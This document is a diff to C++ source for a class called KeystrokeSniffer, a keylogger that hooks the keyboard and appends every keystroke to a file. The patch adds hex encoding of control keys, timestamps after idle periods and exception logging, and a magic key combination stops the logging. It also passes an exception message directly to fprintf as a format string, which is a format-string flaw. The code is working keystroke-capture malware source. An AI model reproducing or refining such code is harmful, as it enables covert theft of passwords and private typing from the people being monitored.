@@ -1425,6 +1425,8 @@ protected:
 	GKeyboard* m_pKeyboard;
 	FILE* m_pLogFile;
 	int m_nMagicPos;
+	double m_lastKeyTime;
+	char time_buf[64];
 
 public:
 	KeystrokeSniffer(const char* szFilename)
@@ -1433,16 +1435,15 @@ public:
 		m_pLogFile = fopen(szFilename, "a");
 		if(!m_pLogFile)
 			throw "Failed to open log file\n";
-		char buf[64];
-		fprintf(m_pLogFile, "\n== Begin at %s ==\n", GTime::asciiTime(buf, 64, false));
+		fprintf(m_pLogFile, "\n== Begin at %s ==\n", GTime::asciiTime(time_buf, 64, false));
 		m_pKeyboard = new GKeyboard(KeyStrokeHandler, this);
+		m_lastKeyTime = GTime::seconds();
 	}
 
 	~KeystrokeSniffer()
 	{
 		delete(m_pKeyboard);
-		char buf[64];
-		fprintf(m_pLogFile, "\n== End at %s ==\n", GTime::asciiTime(buf, 64, false));
+		fprintf(m_pLogFile, "\n== End at %s ==\n", GTime::asciiTime(time_buf, 64, false));
 		fclose(m_pLogFile);
 	}
 
@@ -1463,9 +1464,32 @@ public:
 
 	void OnKeyStroke(char c)
 	{
-		fputc(c, m_pLogFile);
-		if(rand() % 100 == 0)
+		if(c == '\r')
+			c = '\n';
+		else if(c < 32 || c > 126)
+		{
+			char h1 = (c >> 4) + '0';
+			if(h1 > '9')
+				h1 += ('a' - '0' - 10);
+			char h2 = (c & 15) + '0';
+			if(h2 > '9')
+				h2 += ('a' - '0' - 10);
+			OnKeyStroke('<');
+			OnKeyStroke(h1);
+			OnKeyStroke(h2);
+			OnKeyStroke('>');
+			return;
+		}
+		double d = GTime::seconds();
+		if(d - m_lastKeyTime > 120)
+		{
+			fprintf(m_pLogFile, "\n-- Time %s -\n", GTime::asciiTime(time_buf, 64, false));
+			fputc(c, m_pLogFile);
 			fflush(m_pLogFile);
+		}
+		else
+			fputc(c, m_pLogFile);
+		m_lastKeyTime = d;
 		if(c == g_szMagicCombo[m_nMagicPos])
 		{
 			if(++m_nMagicPos >= MAGIC_LEN)
@@ -1478,14 +1502,20 @@ public:
 	static void doLogging(void* filename)
 	{
 		const char* szFilename = (const char*)filename;
+		KeystrokeSniffer ks(szFilename);
 		try
 		{
-			KeystrokeSniffer ks(szFilename);
 			ks.Watch();
 		}
-		catch(std::exception&)
+		catch(std::exception& e)
 		{
-//			fprintf(stderr, e.what());
+			fprintf(ks.m_pLogFile, "[Exception: ");
+			fprintf(ks.m_pLogFile, e.what());
+			fprintf(ks.m_pLogFile, "]\n");
+		}
+		catch(...)
+		{
+			fprintf(ks.m_pLogFile, "[System Exception]");
 		}
 	}
 
